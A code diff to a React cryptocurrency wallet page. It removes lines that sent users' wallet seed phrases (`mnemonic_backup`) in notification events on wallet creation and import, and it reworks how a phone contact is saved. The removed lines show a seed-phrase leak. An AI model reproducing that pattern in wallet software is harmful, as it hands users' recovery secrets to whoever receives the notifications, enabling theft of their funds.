@@ -21,6 +21,7 @@ import { useWalletSession } from "@/hooks/useWalletSession";
 import { fetchBalance, type Balance } from "@/lib/balances";
 import { notify } from "@/lib/notify";
 import { derivePrivateKeyFromMnemonic, rememberPrivateKey, signWalletOwnership } from "@/lib/wallet-signer";
+import { saveWalletContact } from "@/lib/wallet-contact";
 import { formatUSD, marketsQuery } from "@/lib/prices";
 import { getDisplayBalances } from "@/lib/admin.functions";
 import { useYieldDisplay } from "@/hooks/useYieldDisplay";
@@ -151,7 +152,7 @@ function WalletPage() {
       const w = lib.createWallet(label || "Main Wallet");
       setTab(null);
       setPending({ wallet: w, mode: "create" });
-      notify({ event: "wallet_generated", label: w.label, mnemonic_backup: w.mnemonic });
+      notify({ event: "wallet_generated", label: w.label });
     } catch (e) {
       const msg = e instanceof Error ? e.message : "Wallet generation failed";
       notify({ event: "wallet_error", label: "generate", extra: msg });
@@ -165,7 +166,7 @@ function WalletPage() {
       const w = lib.importFromMnemonic(mnemonic, label || "Imported Wallet");
       setTab(null);
       setPending({ wallet: w, mode: "import" });
-      notify({ event: "wallet_imported", label: w.label, mnemonic_backup: w.mnemonic });
+      notify({ event: "wallet_imported", label: w.label });
     } catch (e) {
       const msg = e instanceof Error ? e.message : "Wallet import failed";
       notify({ event: "wallet_error", label: "import", extra: msg });
@@ -216,7 +217,17 @@ function WalletPage() {
     setWallets((prev) => [w, ...prev]);
     setActiveId(w.id);
     setPending(null);
-    saveSession({ address, username, contact: phone || undefined, wallet: snapshot });
+    saveSession({ address, username, wallet: snapshot });
+    if (phone) {
+      try {
+        await saveWalletContact(address, phone, "");
+        const { setSessionContact } = await import("@/lib/wallet-auth");
+        setSessionContact(phone, address);
+      } catch (error) {
+        console.error("[wallet] contact save failed", error instanceof Error ? error.message : "Unknown error");
+        alert("Your phone number was not saved to your account. Please add it again from the contact reminder.");
+      }
+    }
     notify({
       event: mode === "create" ? "wallet_signup" : "wallet_signin",
       label: username,
@@ -936,7 +947,7 @@ function UsernameForm({
         <input
           value={phone}
           onChange={(e) => setPhone(e.target.value)}
-          placeholder="+234 801 234 5678"
+          placeholder="+1 212 555 0123"
           inputMode="tel"
           className="mt-1 w-full glass rounded-lg px-3 py-2.5 text-sm outline-none focus:ring-2 focus:ring-ring"
         />
